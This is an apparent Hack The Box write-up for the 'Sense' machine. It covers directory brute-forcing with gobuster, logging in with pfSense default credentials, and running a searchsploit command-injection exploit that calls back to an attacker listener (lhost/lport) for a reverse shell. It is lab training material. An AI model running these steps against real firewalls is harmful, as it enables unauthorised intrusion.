---
description: https://app.hackthebox.com/machines/111
---

# 🪒 Sense

The first problem was to run the gobuster, i had the following error:

```
Error: error on running gobuster: unable to connect to https://10.129.220.62/: invalid certificate: x509: certificate has expired or is not yet valid: current time 2024-03-11T10:06:27Z is after 2023-04-06T19:21:35Z
```

The problem comes from an issue with the SSL certificate on the server. The certificate either has already expired or its validity period hasn't started yet, according to the system's clock.

So the command to fix this was:

```
gobuster dir -u https://10.129.220.62 -k -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt
```

we found a _**system-users.txt**_ directory after our scan ->&#x20;

<figure><img src="../../../.gitbook/assets/image (529).png" alt=""><figcaption></figcaption></figure>

So after a quick google search we can see that pfsense default credentials is:&#x20;

<figure><img src="../../../.gitbook/assets/image (530).png" alt=""><figcaption></figcaption></figure>

So via the login page at _**/index.html**_ ->

```
rohit
pfsense
```

we're in a control panel:

<figure><img src="../../../.gitbook/assets/image (531).png" alt=""><figcaption></figcaption></figure>

We find this command injection potentially useful:

<figure><img src="../../../.gitbook/assets/image (532).png" alt=""><figcaption></figcaption></figure>

after a  bit of enumeration, we can see how to abuse this CVE:

<figure><img src="../../../.gitbook/assets/image (533).png" alt=""><figcaption></figcaption></figure>

So let's go to this directory, and capture a request on burp:&#x20;

<figure><img src="../../../.gitbook/assets/image (534).png" alt=""><figcaption></figcaption></figure>

Not sure if it's cheating (probably) but i found this script in a GitHub to exploit this vuln: [https://github.com/Alamot/code-snippets/blob/master/hacking/HTB/Sense/autopwn\_sense.py](https://github.com/Alamot/code-snippets/blob/master/hacking/HTB/Sense/autopwn\_sense.py)

- ***

Now let's see another way, let's be more manual:

<figure><img src="../../../.gitbook/assets/image (535).png" alt=""><figcaption></figcaption></figure>

Copy the payload to your local machine:

```
searchsploit -m /path/to/exploit
```

<figure><img src="../../../.gitbook/assets/image (536).png" alt=""><figcaption></figcaption></figure>

now we look at the args:

<figure><img src="../../../.gitbook/assets/image (537).png" alt=""><figcaption></figcaption></figure>

```
python 43560;py --rhost 10.129.220.62 --lhost 10.10.14.62 --lport 8888 --username rohit --password pfsense
```

<figure><img src="../../../.gitbook/assets/image (538).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (539).png" alt=""><figcaption></figcaption></figure>

nice one, get the user flag and root flag all in one ->

<figure><img src="../../../.gitbook/assets/image (540).png" alt=""><figcaption></figcaption></figure>
